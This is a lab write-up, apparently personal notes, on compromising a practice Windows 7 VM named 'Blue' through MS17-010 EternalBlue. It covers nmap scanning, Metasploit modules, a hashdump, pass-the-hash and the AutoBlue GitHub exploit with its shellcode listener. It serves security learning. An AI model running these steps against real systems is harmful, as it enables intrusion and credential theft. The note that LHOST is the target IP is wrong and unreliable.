# Blue Walkthrough

## Enumeration
Once you have Windows running in the foreground, log in to `Blue` using the credentials `Administrator` for the user name and `Password456!` for the password. Go to the Start Menu and search by typing in `cmd` so that we can get the IPv4 address of the machine using `ipconfig`.
![[Pasted image 20220223152655.png]]
Start up your attack machine and open a terminal. We set `$IP` using `export IP=<address>` to the IP address like the one highlighted above. This way, while in the same terminal tab, we don't need to type out the IP every time we want to use it. Use `nmap` to search for services used by windows and save the output to `$IP-blue-scan`.
```bash
nmap -p- -A -T4 $IP -oA $IP-blue-scan
```
From the output, we see that our version of Windows is using the "Windows 7 Ultimate version 7601 Service Pack 1".
![[Pasted image 20220223153535.png]]
Go to Google and search for the exploit to this. There are several, one of which is with Metasploit and another we will use from GitHub. 

## With MetaSploit
After searching around on Google, we find that the box is vulnerable to MS17-010 EternalBlue and we can confirm this in with the `auxiliary` scanner so lets get it started.
`msfconsole` to start metasploit
`search eternalblue` to search for the EternalBlue exploit
`use auxiliary/scanner/smb/smb_ms17_010` for SMB RCE detection
`options` to list out our options. We need to set the `RHOSTS` only and then run the exploit by using either `run` or `exploit`.
![[Pasted image 20220223155021.png]]
Now that we know the box is vulnerable to EternalBlue let us search for it using `search eternalblue`
`use exploit/windows/smb/ms17_010_eternalblue`
`options`
`set rhosts <ip-address>`
`check` : this will confirm that it is indeed vulnerable
![[Pasted image 20220223160805.png]]
Now we can set our `LHOST` using `set lhost <ip-address>` and run the exploit.

Sometimes you'll see that the exploit didn't work as shown below and you have to do it over because the session wasn't created so try it again.
![[Pasted image 20220223151540.png]]

Got the hashdump:
![[Pasted image 20220223142124.png]]
Use Pass-the-Hash toolkit to bypass access for the Administrator. Per MITRE ATT&CK:
> Pass the hash (PtH) is a method of authenticating as a user without having access to the user's cleartext password. This method bypasses standard authentication steps that require a cleartext password, moving directly into the portion of the authentication that uses the password hash.
source: https://attack.mitre.org/techniques/T1550/002/

## Without MetaSploit
Search in google for `eternalblue github` and find one that has good documentation.
There is one called AutoBlue and this is the one that we will be using: https://github.com/3ndG4me/AutoBlue-MS17-010.git
`cd /opt/` and `git clone` that repo and`cd AutoBlue-MS17-010` where we will install necessary libraries with 
```bash
pip install -r requirements.txt
```
We can now check to see if `Blue` is vulnerable with:
```bash
python eternal_checker.py $IP
```
**"target not patched"** means it is not patched against the Eternal Blue exploit.

Running the AutoBlue checker we get:
![[Pasted image 20220223141633.png]]

Now go into the`shellcode` folder and run `shell_prep.sh` with sudo privileges.
```bash
sudo ./shell_prep.sh
```
![[Pasted image 20220223163111.png]]
Enter the following:
`LHOST`: Target IP address
`LPORT`: Target port x64 (can be anything like 9999 and for x86 just ignore it and put something like 2222).
And for the other two:
![[Pasted image 20220223150202.png]]
This will start a listener and depending on what you entered should start our listener.
![[Pasted image 20220223150605.png]]
### Crashing the Blue VM
Going back up to the parent directory of AutoBlue, we can try the exploit which will cause Windows to crash.
![[Pasted image 20220223150922.png]]
Windows will either show a Blue screen or need to restart. So make sure you know what you are doing when running scripts off GitHub.